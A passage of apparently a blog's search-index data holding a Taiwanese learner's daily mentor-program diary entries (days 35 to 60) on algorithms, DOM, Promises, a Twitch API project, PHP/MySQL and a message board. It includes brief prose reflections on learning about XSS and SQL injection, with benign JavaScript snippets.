Spec 來看，真是挺狂熱的。 覺得最有用的東西是 CSS 的屬性吧，像 object-fit 跟 object-position。至於其他大多是觀念補充，就是那種目前用不到，但也許將來某天會用到的那種。 題外話今天的鬼滅不錯哦，感覺越來越精彩了。 期許希望明天可以 week7 的進度。","link":"/2022/01/16/mentor-program-day35/"},{"title":"mentor-program-day36","text":"明天繼續加油。 進度今天心血來潮補了一下演算法的坑： 淺談時間複雜度與空間複雜度 選擇排序法（Selection sort） 泡沫排序法（Bubble-sort） 插入排序法（Insertion-sort） 快速排序法（Quick-sort） 希望未來能寫得越來越好QQ 學到的事情很難得的來碰了演算法，以前一直沒有把這塊學好，但今天學了一些基礎概念，希望未來能越來越厲害。 今天學到的排序法其實大部分都不算抽象（如果是用大腦來思考的話），主要是要「把想法轉變成可執行步驟」這一點比較複雜一點。雖然有些時候蠻頭疼的，但是就當作在練功這樣吧，當會的技能跟概念越來越多的時候，相信自己就會越來越強了。 題外話今天的小當家是正版，太棒啦。 期許希望明天可以開始 week7 的進度。","link":"/2022/01/17/mentor-program-day36/"},{"title":"mentor-program-day37","text":"希望能維持一樣的進度。 進度今天終於把二分搜尋法搞懂，也開始進到 week7 的進度： 二分搜尋法（Binary-search） 什麼是 DOM？ 關於 &lt;script&gt; 的放置位置 用 DOM 選到想要的元素 用 DOM 改變元素的 CSS 用 DOM 改變元素的 Class 用 DOM 改變元素內容 用 DOM 插入或刪除元素 關於 event(e) 阻止預設行為 preventDefaut 事件傳遞機制－捕獲與冒泡 學到的事情很開心今天把二分搜尋法給學完了，而且它真的是蠻有效率的一種搜尋法，附上 LIOJ 上的數據： Time: 240ms Memory: 37MB (basic)Time: 156ms Memory: 37MB (binary-search: while)Time: 160ms Memory: 36MB (binary-search: recursive) 對於 DOM 元素的基本操作也算大概理解了，接下來就是靠實作來累積經驗了。 另外也把一些以前不太懂的事件傳遞機制給弄比較清楚了，明天再把一些細節的部份給搞懂應該就沒問題了，棒！ 題外話魚皮湯是個好東西，便宜好吃又健康。 期許希望明天可以把 [FE102] 看到指定部分，然後開始做作業。","link":"/2022/01/18/mentor-program-day37/"},{"title":"mentor-program-day38","text":"離目標越來越近了嗎？ 進度今天把事件傳遞機制又弄得更完整一些，也重新複習了一點作用域的概念： 阻止事件傳遞 stopPropagation preventDefault 的小知識 萬事拜託你囉！Event-delegation 機制 再次理解什麼是作用域？ 關於 &lt;input&gt; 的寬度問題 也跟著 [FE102] 的內容做了簡單的小玩具。 密碼產生器： See the Pen 簡易密碼產生器 by PeaNu (@jubeatt) on CodePen. 動態通訊錄表單： See the Pen 動態通訊錄表單 by PeaNu (@jubeatt) on CodePen. 學到的事情在一開始學 Event-delegation 的時後會把它跟事件傳遞的機制搞混，不過在實作練習後有清楚許多。像是 delegation 的機制是因為「冒泡」跟「捕獲」階段時都會經過父元素，所以才可以這樣子用，我原本以為是只有冒泡階段才會傳到父元素，但現在搞清楚了。 感覺操作 DOM 確實需要多練習，不然有些時候會霧煞煞的，但相信多累積經驗就會越來越熟悉吧！ 題外話 花生醬蛋餅，好吃。 最近沒什麼靈感，可能最近一直想趕進度吧，所以就少了一點時間來打心得跟廢文。希望未來時間比較充足的時候我能打更多又臭又長的廢文。 期許希望明天可以把 [FE102] 的部分解決，然後開始做作業！","link":"/2022/01/20/mentor-program-day38/"},{"title":"mentor-program-day39","text":"一週過的真快。 進度今天把 [FE102] 的指定部分看完了，一如往常的做了筆記： 借放一下啊！localStorage 與 sessionStorage DOM 冷知識－在一個範圍內找出元素 把 Object 的 value 抽出來變成 Array 把 Array-like-object 變成 Array 也實作了一下以前沒有很清楚的 localStorage 跟 sessionStorage： See the Pen localStorage 簡單使用 by PeaNu (@jubeatt) on CodePen. 最後也利用時間把 week7 的第一個作業給完成了。 錯誤判斷： 成功送出： 學到的事情提到 localStorage 跟 sessionStorage 就讓我想到我一開始學前端時所看的書：HTML5+CSS3+jQuery Mobile輕鬆打造App與行動網站 那時候的我連 JavaScript 都還很陌生，就按照書中的範例用 localStorage 做了一個很簡單的登入系統。老實說實際上在做什麼我毫無頭緒，只是單純的按照 code 來邊抄邊練習。現在回想起來還挺懷念的，這就好像你玩遊戲轉職成遊俠後會開始懷念當初那個還是弓箭手的初心者時光。原來時間過得好快，好快。 在寫 week7 的作業時，因為要操作 DOM 來改變介面，所以一定會碰到「找到相鄰節點」這件事。我不得不吐槽一下「文字節點」真的是一個有夠雷的東西，雖然它背後也許還是有某個存在的必要，但這就跟 CSS 之 inline-block 中的魔法間距 一樣，踩到的時候心中各種「WTF」，怪不得 jQuery 的作者會把它給處理掉。 最後覺得 Code Review 也許真的是個很重要的東西，從別人的 code 真的能學到很多有趣的東西，或者是新的發現。但有些時候卻好懶得 Review，不是說不喜歡 Review 這件事本身，而是 Review 是要花時間的，所以就會陷入「到底該花時間 Review 還是趕進度」的窘境。唉～時間果然是人類的最大強敵。 題外話在疫情還沒有越來越嚴重之前，要去跟女朋友吃鬆餅，開心！ 還是希望疫情不要越來越嚴重才好，如果每個人都能好好注意就好了。 期許希望明天可以把 week7 的作業完成，可以的話最好也把挑戰題做完。","link":"/2022/01/20/mentor-program-day39/"},{"title":"mentor-program-day40","text":"再見了鬆餅。 進度今天繼續做第七週的作業，在自我檢討的時候學到了一點小技巧： DOM 清掉惱人的文字節點 實作 DOM 的 closest 方法 附上今天做的作業 HW2： HW3（切到一半的版）： 也是迅速給他切完，雖然很多單位都憑感覺在設 XD，但不管了啦～反正重點是要練習操作 DOM。 學到的事情好想把遞迴精通阿。 不過還是沒有完全抓到那個「可以隨心所欲使用的 Fu」，目前的程度還是看別人的 code 才會想到「哦對耶，這可以遞迴來解阿」，但是沒關係，就多多練習做筆記，現在也做過蠻多遞迴的題目了，相信之後能越來越熟的。 另外說個小悲劇，今天在處理 branch 的時候不小心把 wee7 的 hw1 作業檔案給誤刪，害我又得重做一次！還好是昨天剛做完記憶還很猶新，重新弄過沒有花很多時間。但下次真的要小心一點 orz 關於 DOM 的文字節點難題讓我想到之前在寫面試測驗的一個問題，剛好就是要找出 xx 元素上面有幾個父元素這種題型。可惜那時候還很菜，光是處理文字節點就手忙腳亂，如果現在在考一次說不定就能利用今天學會的遞迴來 PASS。 題外話 再見了鬆餅，希望下次見面不會太久 可惜高雄的疫情實在太嚴重了，有點擔心，所以只好等之後了 QQ 期許希望明天可以把 week7 的作業完成，可以的話挑戰題也順便！","link":"/2022/01/21/mentor-program-day40/"},{"title":"mentor-program-day41","text":"現在腦袋滿滿的 Promise。 進度今天把第七週的 todo list 給完成了： 硬要加個紅綠燈看起來比較強大 ( ～’ω’)～ 後來因為剛切完版暫時不想再切，跑去研究 Promise Async Await 相關的東西，也順便把碰到的問題做了些筆記： Promise 的小技巧 執行 IIFE 的三種方式 讓 click 和 enter 觸發同個事件 CSS 的絕對定位範圍 在 CSS 中做字串拼接 希望我真的搞懂 Promise 了～ 學到的事情先來談談關於 todo list 吧，其實做起來比我預期中的簡單很多，原來用原生 JavaScript 來寫東西就是這種感覺，很舒暢，怪不得有些人對於 Vanilla JS 抱持執著，大概能理解了。 不過我也知道，目前做的算是最基本的功能而已，所以希望有空的話能加一些更猛的功能，像是 localStorage 或 filter 之類的。 接下來來談談關於 Promise，其實是因為某個 巴友 用 JavaScript 寫了很多小玩具給巴友，其實以前就有看過他的 code 跟小屋，但當時的我太菜了所以沒有完全看懂。今天再回過頭來看發現自己大概已經能看懂 80%，甚至要自己寫一個同樣的東西出來感覺也不是問題？ 所以就抱著這股熱血沸騰的心去做了很多 Promise 的相關練習。雖然做的途中發現自己有些觀念還是不夠清楚，但至少有找出自己的錯誤，我想這點是好的，知道錯誤才知道要怎麼改善。接下來要多多練習，讓自己越來越強！ 題外話 七星破軍我不行了 這個梗玩幾遍都玩不膩 (ゝ∀･)b 期許希望明天可以做做看 week7 的挑戰題，似乎是 carousel？或是也可以把 todo app 加點新功能，期待自己的作品越來越豐富！","link":"/2022/01/23/mentor-program-day41/"},{"title":"mentor-program-day42","text":"獻給 Carousel 的一天。 進度今天做了第七週的挑戰題： 本來只打算做出基本功能就收手，但後來想支援 RWD 又加了一點東西；寫完 RWD 後又發現能在利用 JavaScript 來讓東西變成動態產生；直到最後想說： 「啊！既然都寫到這裡了，倒不如寫成一個模組？畢竟 Carousel 這東西還蠻常見的」 所以就真的寫成一個很「陽春版」的 小套件 了。 學到的事情 把大問題拆成小問題 這句話對我來說一直都都很經典也很實用，從一開始切 Carousel 的版面，接著寫 JavaScript 來控制幻燈片，我都是一步一步來，因為我自認我的腦容量很小。不要求一開始就設想全局，只求先把東西做出來，之後再慢慢優化。 以前看到霹靂啪啦一大堆的程式碼就會腦袋很混亂。但如同 Huli 所說，其實只要好好去做到「命名」跟「排版」就能改善這個問題。雖然有時候還是會多到眼花瞭亂啦，但覺得現在自己不再那麼害怕「程式碼好亂好雜」這件事了。 當你要的功能越多，或是 CSS 規則越多，程式碼就一定也會相對增加。你不可能永遠期望程式碼看起來很乾淨，而是你要學會怎從一大堆程式碼中抓出重點。 這一點是我覺得自己學到最重要的事情。 今天也學到怎麼用原生 JavaScript 來寫幻燈片的動畫，以前我都只會用 jQuery 寫好的 function（.animate） 來做，但今天做完才發現「疑？其實沒那麼複雜啊」，一個蠻有意思的小插曲。 另外也很開心第一次寫出了「模組」，雖然絕對比不上網路上各種有名的 Carousel 套件，但能自己做出東西來的感覺很棒，很開心。 題外話希望這世上愛秀優越的人少一些，不喜歡那些自己產生優越感就去攻擊別人的人，差勁。 期許希望明天可以把 week7 檢討完後，開始 week8 的進度。","link":"/2022/01/24/mentor-program-day42/"},{"title":"mentor-program-day43","text":"新的一週又開始了。 進度今天把昨天寫的小玩具寫成一個正式的 套件。 另外也深入研究了一下利用 DOM 改變 transition 製造簡單的動畫效果，也順手仿製了一下 jQuery 的方法，還蠻有趣的： DOM 之在動畫結束後做某件事 最後也把 week7 的作業自我檢討，把學到的新東西給記下來： 善用跳脫字元，避免不合法的輸入內容 DOM 一些邊緣但蠻好用的 API 學到的事情從昨天捏套件到今天仿製 jQuery 的 animate，感覺自己越來越熟悉 function 跟 callback 這兩個東西，還有一直想理解的「模組」觀念。雖然現在只是第一步，但這一步卻格外地有意義。也許是因為以前的我做不到這些事情吧。希望接下來還能變得越來越強。 另外在看 [FE102] 時提到了「同源策略」，讓我好奇「為什麼只有瀏覽器有這個限制？」 所以我上網做了一點研究，理解了原因，還順道把以前書上看都沒看懂的「XSS 攻擊」給弄懂了。不得不佩服想出這些攻擊方式的人，就跟想出「JSONP」來繞過同源策略的人一樣，真的是太機智了。 題外話可惡！今天錯過正版李嚴了啦( º﹃º ) 期許希望明天把筆記做完後開始做 week8 的作業。","link":"/2022/01/24/mentor-program-day43/"},{"title":"mentor-program-day44","text":"時間一天一天的走，PeaNu 一天一天的成長。 進度今天做了 week8 的第一個作業： 也順便做了挑戰題： 學到的事情在 hw1 中我學到怎麼去把 code 給優化。 其實大部分在解題的時候都是用「先求有，再求好」的心態來寫 code，所以一開始的 code 真的是其亂無比。但在把 code 優化的過程我覺得是很有意思的，因為一開始在解題時不會想到「诶？這裡其實能包成一個 function」的想法。比較多都是先寫了一長串，再來精簡化，套到 CSS 上也有異曲同工之妙。 從進階挑戰提中我對於「同步 / 非同步」有了更深的理解。希望之後能融會貫通。 題外話每天的夜晚都好漫長～ 期許希望明天把 week8 的作業做完。","link":"/2022/01/25/mentor-program-day44/"},{"title":"mentor-program-day45","text":"今天給自己打幾分？ 進度今天做了 week8 的第二個作業： 好久不見的 Twitch，雖然還沒完全做完，但希望明天能把它做的越來越好。 學到的事情在串 API 的時候有個蠻特別的部分是「圖片網址」要自己設定寬高度，所以資料格式是長這樣： https://static-cdn.jtvnw.net/previews-ttv/live_user_lck_korea-{width}x{height}.jpg 這時候以前學的「正則表達式」就派上用場了： 1234// 匹配 {a到z大小寫}x{a到z大小寫}const regExp = /\\{[a-zA-Z]+\\}x\\{[a-zA-Z]+\\}/const url = \"https://static-cdn.jtvnw.net/previews-ttv/live_user_lck_korea-{width}x{height}.jpg\"url.replace(regExp, '600x360') 就可以拿到指定的圖片尺寸： https://static-cdn.jtvnw.net/previews-ttv/live_user_lck_korea-600x360.jpg 以前花時間學的東西能派上用場，就讓人感覺特別開心。 另外串 API 不外乎就是要做各種「非同步」處理。儘管現在有好用的 Promise 可以避免「callback hell」，但還是想加強自己對於「callback」的概念。所以在寫 hw2 的時候都還是用傳統的 xhr 老方法來做，希望自己有天能成為 callback 大師！ 我覺得非同步最麻煩的地方在於「迴圈」吧？因為這樣子寫絕對是錯的： 12345for(let i=1; i&lt;=10; i++) { setTimeout(function() { console.log(i) }, 1000)} 這樣寫絕對不是「每一秒印出 1, 2, 3, ..., 10」，而是 1 秒後直接印出 1 ~ 10。 所以就不能用迴圈來寫，而是得用「遞迴」的方式來做（先不管 Promise 這個好用的東西）： 12345678910111213let total = 10let start = 1function loop(i) { if (i &gt; total) { return undefined } setTimeout(function() { console.log(i) // 一秒過後再 call 一次 loop loop(++i) }, 1000) }loop(start) 所以換成發 request 的話可能就要變成這樣： 12345678910111213141516171819// 總共要發幾次 requestlet total = 10// 代表發了幾次 requestlet counter = 1function callback(data) { // 拿到資料就更新一次次數 counter += 1 /* ... ... ... */ // 發夠了就跳出去 if (counter &gt; total) { return undefined } // 不夠的話繼續 call API getData(url, callback)} 好在一直都有練習遞迴的概念，不然大概會在這裡死很慘 ∑(✘Д✘๑ ) 題外話希望明天能買到好吃的胡椒餅。 期許希望明天把 week8 的作業做完。","link":"/2022/01/26/mentor-program-day45/"},{"title":"mentor-program-day46","text":"日復一日。 進度把昨天的 hw2 沒做完的部分補完，也新增了挑戰題的「顯示更多」功能： 看了舊版的 Twitch API 才察覺新版實在是不友善，不知道為什麼會 deprecated（棄用） 呢？ ( ´•̥×•̥` ) 學到的事情我還是覺得「非同步」是個會讓腦袋打結的觀念，尤其是要「遞迴」的方式來重複執行。 另外昨天為了搞出「實況主頭像」搞了半天，明明用 GET 帶上的 user_id 是 1, 2, 3 這樣的順序，吐回來的資料確有可能是 3, 2, 1 或 2 1 3 各種隨機可能，真的是滿頭問號？？？ 我有想過既然回傳資料不會按照請求排序，那是不是只好「一個一個發請求」，例如說我要 20 個 user 資料，我就依照順序發 20 次「取得單個 user」的資料是不是也行？不過這樣的效率實在有夠差，我測試的結果是從原本的「1 ~ 2秒」變成「10 ~ 11 秒」。 我靠，這使用者體驗也太糟了吧！我覺得不行，阿嶽也覺得不行。 所以明天打算偷拿 example 裡的 client_id 來重新串一次舊版的 Twitch APi，希望可以讓這作業畫下完美的句點。（我有試著自己重瓣一個 client_id，但無奈的是新辨的 client_id 不可以串舊版的 API，所以請原諒窩 QQ） 題外話烏骨雞好吃耶。 期許希望明天真的能把 Twitch 的作業給做完，然後檢討一下作業～","link":"/2022/01/27/mentor-program-day46/"},{"title":"mentor-program-day47","text":"精疲力竭。 進度用舊版的 Twitch API 重新串了一次，最後也加了「無限滾動」的功能： 為了加無限滾軸的功能真是廢了不少心力… 學到的事情舊版的 API 在資料的串接上比新版輕鬆不少，該有的東西都附在裡面，不像新版還要打很多的 API 去拿不同的資料。 這次重做的部分一律改用 Promise 來處理，不得不說整體的結構比 callback 還要好懂多了，要修改東西時也不會亂七八糟的，用一句話來說就是： 舒服。 感覺像是兩種不同的世界一樣，怪不得現在滿街的 Promise… 另外就是「無限滾動（Infinite Scroll）」的部分，本來是沒有打算做這部分的，不過既然女朋友都敲碗了，那我就加油點吧( ºωº ) 不過也藉此學到了一個還不錯用的 API：IntersectionObserver，比起傳統上的監聽 scroll 作法，這個確實比較直覺，也能避免最大的問題「重複觸發」。雖然還是有一些難免的 bug（有可能是我邏輯沒寫好），像是誤觸或偶爾的重複觸發問題，這部分我盡力用 flag 來控制，目前測試起來是有改善一點，不過實際穩不穩定還是要等之後有時間再測試看看了。 題外話下一整天的雨，真是討厭～ 期許也許明天檢討完就能開始進到 week9 的進度了，特別新奇的後端世界～","link":"/2022/01/28/mentor-program-day47/"},{"title":"mentor-program-day48","text":"筆記的一天。 進度今天把一些 week8 學到的部分做了筆記，也做完了自我檢討： DOM 清除所有的子元素 CSS 好用的 filter 屬性 用 JavaScript 改變 CSS 的變數 利用 IntersectionObserver 來製作無限滾動 什麼是 AJAX？ 什麼是 JSONP 明天就會正式進入 week9 的進度了，抱著一點既期待又害怕受傷害的心情（真的要來學後端了阿～）。 總而言之先祝自己一切順利 ξ( ✿＞◡❛) 學到的事情今天大多是複習比較多，現在的我應該能有自信的說： 我知道 AJAX 是什麼，也會知道怎麼串 API。 這週的核心知識也是以這些為主。不過我還是覺得自己不是 callback 大師，當波動拳出現時就好像「打不倒的空氣人」一樣，儘管做好的準備還是會被虐一波。（RRRRRR 但沒關係，我相信總有一天能戰勝它的。 題外話其實在學習了這麼久的前端後，有些想法慢慢的改變了。以前的我總覺得前端到底為什麼要學 CSS？我明明是工程師為什麼要學怎麼刻介面？當我工具人？樣樣都要會？？？ 但現在突然會有點覺得其實挺慶幸能學 CSS，因為： 哇，你除了寫程式以外還能自己做介面哦，也太屌了吧？ 不是有人跟我這樣說過，純粹是我自己腦補的。 該怎麼說，雖然大家都說前端的門檻相對簡單，但我自認前端工程師有個其他工程師不一定會有的東西：自己捏一個 UI 介面 但也不是說這樣比較厲害所以優越什麼的，只是想告訴自己其實學了這些技術都是有意義的。雖然有時候學起來真的蠻煩的，但最後當你掌握了這些工具之後，其實這一切都還蠻值得的。 期許明天就要進入 week9 了，再次祝福自己一切順利～","link":"/2022/01/29/mentor-program-day48/"},{"title":"mentor-program-day49","text":"初次見面的後端。 進度總算進到後端的部分了，雖然才剛開始但也做了點筆記： Apatch 與 PHP 的運作原理 PHP 基礎 為什麼要用資料庫？ 關聯式與非關聯式資料庫 什麼是 Schema（結構） 學到的事情在前端混了這麼久以後，終於來到了後端。今天大致認識了後端的生態體系，第一次寫 PHP 的感覺也很特別，原來換個程式語言來寫程式是這種感覺。 不過拿以前寫過的 C 語言來跟 PHP 來比的話會覺得 PHP 還算友善，在 C 語言裡要輸出跟輸入就要先搞個 &lt;stdid.h&gt; 標頭檔，要輸出內容就要用格式化輸出 printf() 搭配 %s 和 %d 等等的東西，第一次接觸的時候真的會想說： 我到底看了三小？ 不過我記得 PHP 裡面也有提供 printf() 這個 function，應該說不只是 PHP，只要是程式語言都有機會看到「格式化輸出」的 function。 總之我覺得這是蠻有趣的事情，不管是哪個程式語言它們都有相同的影子。 題外話鬼滅快完結了阿，記得油鍋篇剛播時我才剛執行這份計畫。現在已經要完結了，時間果然過得很快。 期許明天要繼續加油，希望把資料庫的操作給弄熟～","link":"/2022/01/31/mentor-program-day49/"},{"title":"mentor-program-day50","text":"新年快樂。 進度開始看 [BE101] 的課程，今天主要學跟資料庫相關的東西： MySQL 語法 PHP 中常用的內建函式 從 PHP 認識前端與後端的溝通 學到的事情之前其實就有稍微玩過資料庫，不過是 NoSQL 的資料庫：MongoDB。 以前有想過要學 MySQL 這個資料庫，但是網路上的環境建置教學實在是太詳細（複雜），所以最後就放棄了。XAMPP 是個很友善的安裝包，在這裡感謝一下發明這個東西的人。 不過 MySQL 的指令還不是很熟，像 INSERT INTO 跟 UPDATE，總會搞錯 SET 是誰家的小孩，還有 &lt;column&gt; 要不要用 () 包住，希望之後寫久了會越來越熟悉吧。 今天最有趣的事情是學到透過「表單」溝通的時候後端到底都怎麼處理資料的，原來也沒有那麼複雜，總之是件很開心的學習旅程。 題外話希望不論時間過了多久，我都能像現在一樣喜歡寫程式這件事。 期許明天也要更努力，希望把後端這塊拼圖給拚完。","link":"/2022/02/01/mentor-program-day50/"},{"title":"mentor-program-day51","text":"過年不好趕進度。 進度這幾天因為都去女朋友家過年，所以只有用手機看看文章來學以前沒有弄懂的 JS 觀念： function 中的 call apply bind 學 hoisting 之前先理解 EC 是什麼？ 學到的事情雖然自己覺得落後了很多進度，但還是盡量利用時間來學習。有件蠻開心的事情是終於把 我知道你懂 hoisting，可是你了解到多深？ 的內容給看懂了（至少有 90% 吧），以前看到 ECMAScript 規格書的部分就收手了，畢竟「理論」的東西雖然嚴謹，但也相對硬，在 JS 基礎不好的情況下讀起來是蠻吃力的。 不過在參加了程式導師計畫後，JS 基礎的部分一步一步建立起來，所以不知不覺中就能夠把以前一直看不懂的東西給看懂了，這是我覺得很有成就感的地方。 題外話雖然進度落後，但希望還是要盡量利用時間。 期許這幾天可能不太有機會趕進度，但還是盡量加油吧！","link":"/2022/02/03/mentor-program-day51/"},{"title":"mentor-program-day52","text":"快過完的年。 進度一樣是進度少少的一天，今天把資料庫的 CRUD 給複習完畢： MySQL 連線到資料庫 MySQL 讀取資料庫中的資料 MySQL 建立新資料到資料庫 MySQL 從資料庫中刪除資料 MySQL 修改資料庫中的資料 學到的事情感覺對資料庫的操作有比較上手點了，也逐漸習慣 PHP 的語法了，還不錯。 題外話這世界是除了懂二進位跟不懂二進位的人以外，我想還有懂玩牌跟不會玩牌的人 (つд⊂) 期許希望明天可以開始做 [BE101] 的實戰部分。","link":"/2022/02/03/mentor-program-day52/"},{"title":"mentor-program-day53","text":"快兩個月了。 進度今天延續 [BE101] 的內容，做了第一個實戰練習「Job 職缺報報」： 學到的事情產品構想是一個很有趣的地方，以前從沒做過，雖然只是很簡單的構想，但從無到有的過程很有趣。 對於後端跟資料庫的溝通也逐漸在練習中越來越熟悉，不過也開始體會到 Huli 說的「大雜燴」是什麼概念。當東西越來越多的時候絕對是很難維護的，期待之後的課程會解釋該如何利用工具解決問題。 題外話鬼滅要完結啦～ 期許希望明天把職缺報報的最後部分做完，接著進到下一個實戰：部落格","link":"/2022/02/05/mentor-program-day53/"},{"title":"mentor-program-day54","text":"最後一天的新年快樂。 進度今天一樣做 [BE101] 的實戰練習「部落格」。 後台也做的差不多了，只剩最後的調整就能完成。 學到的事情雖然最主要的實戰練習是「留言板」，但從這兩個實戰裡我也學到了蠻多東西，也對一個網站的前後台更加熟悉。現在的 code 確實很髒很亂，不過相信在接下來的課程裡會一一找出解決辦法吧。 另外也對一些事情產生感觸，在我還不懂後端時，我覺得寫後端的人真厲害，能做出我不會的後台管理跟資料庫串接，但當我學了後端之後，才意識到為什麼後端工程師也會崇拜前端工程師。 不管是空有功能還是空有畫面，兩者都必須互相配合。空有畫面沒有功能，還是空有功能但卻沒有畫面都是不行的，少了其中一個就會問題很大，也讓人用不下去。 所以當大家在爭論「前端跟後端誰比較厲害」的時候，我會覺得沒有必要爭這個，不論是前端還是後端，在網頁的世界裡都是很重要的角色，沒有誰比較厲害誰比較低劣這回事。 題外話今天就能看到鬼滅了～ 期許希望明天把部落格做完，正式進到真正的留言板實戰。","link":"/2022/02/06/mentor-program-day54/"},{"title":"mentor-program-day55","text":"開工囉。 進度今天把「部落格」實戰練習給做完整，接著就做下一個實戰練習「留言板」。 目前做了最基本的功能： 發佈留言 註冊功能 登入功能 學到的事情留言版是所有實戰練習裡面最有趣的一個，也真的學到了「Cookie 該怎麼用」這件事。以前都覺得登入功能聽起來蠻複雜的，但實際做之後才發現也沒那麼複雜？之後也想去嘗試各種東西，希望能把以前想學但沒學過的東西給學起來。 另外也體會到「在前端寫網頁」跟「在後端寫網頁」的差異，在前端的世界裡一切都是靜態的（沒有扯到網路的話），但在後端的世界裡卻都是動態的（因為要跟資料庫連結）。還有一點很特別的是在後端要做「驗證」可以用 Location 帶 GET 參數來取得資訊這點很有趣。 只是想說兩種不同的感覺蠻有意思的，因為是一種新的體驗吧？我也不知道該怎麼說～ 題外話原來鬼滅還有第 11 集呀，太驚人了，滿滿的經費燃燒。 期許希望明天把 [BE101] 看到指定段落，也希望留言板變得越來越強大。","link":"/2022/02/07/mentor-program-day55/"},{"title":"mentor-program-day56","text":"不知不覺兩個月快過去了。 進度今天繼續做留言板的部分，主要是對背後的 code 做優化，像是把 session 改成用 PHP 的內建方法，還有一些可以包裝成 function 的片段等等。 雖然已經把 [BE101] 看到指定的段落了，但出於好奇，所以接下來的時間都在看後面的影片，也認識了很多目前留言版的漏洞，駭客會怎麼攻擊之類的。不過都還沒有自己實作過，因為突然感到特別疲倦，不知道為什麼。總之希望明天能打起精神來吧！ 學到的事情就跟進度提到的差不多，除了更認識了 session 「機制」以外（又或者是說「上下文」），也認識了什麼是 XSS 跟 SQL Injection，駭客會怎麼攻擊你的網站這樣子。如果早一點學程式的話說不定我也能當駭客？ 題外話不管是從事什麼職業，人好像都會面臨一段低潮期。像我總是會有段時間感到沒什麼動力，也會否定自己的能力。該怎麼讓自己打起精神來，這個答案有時候也挺模糊的。 也許今天 A 會覺得我進步很多呀，要我繼續加油，不要氣餒；但同時也會有 B 覺得我怎麼還停留在這裡，都在做什麼？這種矛盾的心情有時候自己也很難解釋，不知道自己到底處在哪個邊界上，所以就會感到失落。 總之，還是要打起精神來的對吧，雖然要學習的東西會變得越來越複雜，但我依然相信一步一步來總能夠學會跟做好的。雖然還不知道自己的未來會變得怎麼樣，但我還是想盡力去把這份計畫做到最好，變成自己心目中的那副模樣。 期許希望明天把 [BE101] 的部分看完，接著可能會把留言板重頭來過，看自己能不能從零開始做出來。 老實說這是最麻煩的部分，但這也許是檢驗自己的最好辦法吧？","link":"/2022/02/08/mentor-program-day56/"},{"title":"mentor-program-day57","text":"How far I’ll go. 進度今天把從留言板學到的知識做了筆記，也開始處理安全性的問題，像是密碼不能存明碼之類的。 一樣附上今天做的筆記： 利用 Cookie 實作登入機制 當 Cookie 被竄改會怎麼樣？ Encode、Encrypt 跟 Hash 的差別 做筆記總是比較花時間呀。但做筆記的好處是不會過一段時間之後就忘記以前學過的知識，會比較刻印在腦海裡的感覺，所以還是蠻喜歡做筆記的。 學到的事情今天主要是複習怎麼透過 Cookie 來建立 Session 的觀念。這個部份感覺蠻重要的，所以希望能弄熟，不要只是草草帶過。 另外也在 [BE101] 學到了蠻有趣的攻擊方式。以前我只從書上學到 XSS 可以偷 Cookie，不知道原來還可以把使用者帶到釣魚網站，還有各種奇葩邪惡的事情，怪不得有些駭客能夠從中找到樂趣，也不是不能理解啦。 題外話：其實以前看書學 XSS 時，因為範例實在太過精簡，只有一行程式碼的那種，導致我根本沒搞懂那倒底在做啥。但有了直接展示在眼前的範例後就馬上理解了，也許這就是教學影片能夠超越書本的地方吧，一個有感而發的題外話。 至於 SQL Injection 就跟 XSS 的攻擊方式差不多，我只能說： 才華洋溢 我是說…請把才華用在正確的地方。 題外話時間過得很快，有時候會擔心自己投入太多時間在學習上，犧牲了跟女朋友相處的時間，這種心情還挺複雜的。可是還是會告訴自己要堅持下去，相信當未來日子改變後，相處的時間就能增加。 還是老樣子，希望一切順利，人生有趣（惡意）的地方就是永遠不知道下一秒會發生什麼。 許願池（偷偷的標題從期許改成許願池，因為這樣更有意境…吧？） 希望明天把 [BE101] 看到我想看的段落，然後趕快把第九週的任務完成。","link":"/2022/02/09/mentor-program-day57/"},{"title":"mentor-program-day58","text":"努力趕進度 進度今天一樣修正留言板的問題，學會怎麼攻擊跟防守： 從玩壞自己的網站來學習 XSS 用 SQL Injection 來玩壞資料庫 總算是把這部分給完成了，明天要來重頭來過。 學到的事情如上所說，寫程式就像角色扮演一樣，只會攻擊或防守的話是不夠的，必須兩者兼具才能成為厲害的人。 今天最有趣的地方是把偷 Cookie 的方法實作出來了，以前都只是聽別人說但沒有自己做過，做完後發現也沒有那麼複雜，真正難的地方是能夠「想出這種方式」，我是這樣想的。 做留言板的這幾天，體會到什麼叫做魔鬼藏在細節裡。一個網站的安全性與漏洞，是以前的我不會去考慮的事情，只會想著東西做出來就好了。但是不是這樣子，當實際去思考駭客會怎麼攻擊，要怎麼應對時，才會發現背後要做的處理真的很多，一個不小心就會凸槌或ㄅㄧㄚˋ康，只能說資安真的是個很有挑戰性的職業。 題外話 The more you gain by pretending, the less you’re actually gonna have. 雖然這是一段聽起來很有道理的話，但總覺得從現實看到的並不是這樣子。 如果我也有神燈的話，我會許願，跟女朋友一起過著平凡的生活，不需要榮華富貴的一切，只需要雙方陪伴彼此的心。 許願池明天要來做 week9 的作業，把留言板重頭來過，希望能趕快進到後面的進度。","link":"/2022/02/10/mentor-program-day58/"},{"title":"mentor-program-day59","text":"繼續衝衝衝～ 進度今天把留言板又重做了一遍，沒有花很多時間就做完了。接著就做自我檢討，也有參考其他同學寫的作業。 這週的作業就是複習上課的實作內容，所以還蠻快速的，希望接下來能把進度趕快來（過年荒廢了一週），加油！ 學到的事情當我回過神來，發現自己已經習慣用 CLI 來取代一些「用滑鼠的話會很麻煩的操作」，例如說在看同學作業時我都是這樣開檔案： 但如果改用滑鼠的話（GUI）： 用看的好像會覺得 GUI 比較方便，但很懶得碰滑鼠的時候就會覺得 CLI 真的方便多了，很慶幸有學會 CLI。 在檢討作業的簡答題時，有去看別人是怎麼寫的。每個人腦袋瓜想的都不同，這一點還蠻有趣的，同樣的概念每個人都有不同的敘述方式，雖然看來看去還是覺得自己寫的最好懂，但還是能從其他人身上學到一些自己沒注意到的概念，或者是一些蠻有創意的想法。 總之，我覺得「看同學作業」還是蠻值得去做的一件事，儘管這比較花時間。 題外話 撐過去就是你的。 好好好，加油～（？？？ 許願池明天進到 wee10，雖然說是複習週，但我還是想趕進度 QQ 希望明天能快速複習，然後開始跑 week11 的進度～","link":"/2022/02/11/mentor-program-day59/"},{"title":"mentor-program-day60","text":"真正的兩個月～ 進度因為 week14 就要部屬網站了，但課綱裡沒有看到相關資源，所以今天花了一些間看了 [MTR01] 的 Lesson8，看看能不能找出一些線索，還好裡面有提供蠻多資訊的，希望之後不會碰到太多困難。 另外也把 week10 的小遊戲都破關了，寫了一篇簡短的紀錄：R30 異世界網站挑戰－簡短紀錄 